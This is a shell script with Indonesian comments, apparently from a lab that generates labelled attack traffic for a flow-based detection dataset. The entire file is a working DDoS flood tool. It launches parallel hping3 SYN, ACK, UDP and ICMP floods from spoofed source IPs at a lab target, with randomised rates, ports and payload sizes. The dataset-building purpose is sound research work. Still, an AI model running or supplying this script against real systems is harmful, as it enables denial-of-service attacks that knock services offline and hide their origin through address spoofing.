#!/bin/sh
# serang_flood.sh — REVISI 2026-11-10 (anti-kebocoran label),
#                   REVISI 2026-11-24 (seed dan log parameter, butir 11).
# Jalankan di Penyerang-1. DDoS flood dari banyak sumber palsu.
#   SEED=20261124 nohup sh serang_flood.sh 1800 > /tmp/flood_sesi5.log 2>&1 &
#
#   1. Rentang IP sumber flood DIPISAH dari scanner: flood = .31-.250,
#      scanner (serang_scan.sh) = .11-.30. Label cukup dari rentang IP sumber.
#   2. Semua bilangan acak berasal dari pembangkit ber-SEED (generator Park-Miller, keadaan disimpan di variabel X), dan
#      setiap parameter yang ditarik ditulis ke log. Dengan seed dan log yang
#      sama, urutan parameter serangan dapat diulang. Waktu kirim paket tetap
#      bergantung pada jaringan, jadi flow yang terekam tidak identik.
#      Distribusi parameter SAMA dengan versi 2026-11-10 (sesi 1-4).
#
# PENTING: reset collector sebelum sesi baru agar hitungan flow bersih.

TARGET=192.168.30.10
LAMA=${1:-1800}
SEED=${SEED:-$(date +%s)}
SRC_LO=31          # oktet terakhir sumber flood (DIPISAH dari scanner .11-.30)
SRC_HI=250
SELESAI=$(( $(date +%s) + LAMA ))
X=$(( SEED % 2147483646 + 1 ))   # keadaan generator, tidak boleh 0
# r A B -> R = bilangan bulat acak di [A, B]. Fungsi dipanggil tanpa subshell
# supaya keadaan generator X tetap tersimpan.
r() {
  R=$(awk -v x="$X" -v a="$1" -v b="$2" \
      'BEGIN{x = (x * 48271) % 2147483647; print x, int(a + x / 2147483647 * (b - a + 1))}')
  X=${R% *}; R=${R#* }
}

echo "$(date +%s) flood MULAI dur=${LAMA}s seed=$SEED src=192.168.20.${SRC_LO}-${SRC_HI} target=${TARGET}"

while [ "$(date +%s)" -lt "$SELESAI" ]; do
  r 1 6
  case $R in                              # jenis flood
    1|2) MODE="-S" ;;          # SYN flood
    3)   MODE="-A" ;;          # ACK flood
    4)   MODE="-S -A" ;;       # SYN-ACK
    5)   MODE="--udp" ;;       # UDP flood
    6)   MODE="--icmp" ;;      # ICMP flood
  esac
  r 10 20; BATCH=$R                       # berapa burst paralel per putaran
  echo "$(date +%s) flood mode=\"$MODE\" batch=$BATCH src=192.168.20.${SRC_LO}-${SRC_HI}"
  k=0
  while [ $k -lt $BATCH ]; do
    r $SRC_LO $SRC_HI; SRC="192.168.20.$R"  # sumber palsu DIPISAH dari scanner
    r 1025 60000; SPORT=$R                # port sumber tetap per-burst -> 1 flow padat
    r 30 250; NPKT=$R                     # jumlah paket per flow
    r 800 8000; LAJU="-i u$R"             # 125-1250 paket/detik
    r 0 1200; DATA=$R                     # payload acak -> avg_packet_size bervariasi
    r 1 4
    case $R in 1|2) DPORT=80 ;; 3) DPORT=443 ;; 4) r 1 1024; DPORT=$R ;; esac
    echo "$(date +%s) burst src=$SRC sport=$SPORT dport=$DPORT npkt=$NPKT laju=$LAJU data=$DATA"
    timeout 6 hping3 $MODE --keep -s "$SPORT" -p "$DPORT" -c "$NPKT" $LAJU -d "$DATA" \
      -a "$SRC" "$TARGET" >/dev/null 2>&1 &
    k=$((k + 1))
  done
  wait
  r 1 2; sleep "$R"
done

echo "$(date +%s) flood SELESAI seed=$SEED"
